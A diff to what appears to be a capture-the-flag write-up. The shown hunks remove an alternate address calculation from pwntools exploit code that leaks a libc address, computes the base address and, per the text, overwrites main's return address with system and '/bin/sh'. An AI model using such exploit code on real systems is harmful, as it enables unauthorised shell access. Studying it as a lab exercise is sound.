@@ -156,7 +156,6 @@ p.sendline(MY_NAME)
 
 p.recvuntil("\n")
 leaked_addr = '\x00' + p.recv(3) 
-alt_addr = leaked_addr[1:] + p.recv(1)
 ```
 
 With the base address, it is *easy* to find the real address of `'/bin/sh'` and `<system>`. We will overwrite the return address of `<main>` with the real address of `<system>`. The real address of `"/bin/sh"` comes 2 DWORDS after that.
@@ -197,18 +196,14 @@ p.sendline(MY_NAME)
 
 p.recvuntil("\n")
 leaked_addr = '\x00' + p.recv(3) 
-alt_addr = leaked_addr[1:] + p.recv(1)
 
 leaked_addr = u32(leaked_addr)
-alt_addr = u32(alt_addr)
-alt_addr = (alt_addr << 8) & 0xffffffff
 
 
 leaked_addr_offset_from_base_addr = 0x1b0000
 base_addr = leaked_addr - leaked_addr_offset_from_base_addr
 print "Base address: " + hex(base_addr)
 print "Leaked: " + hex(leaked_addr)
-print "Alt: " + hex(alt_addr)
 
 
 
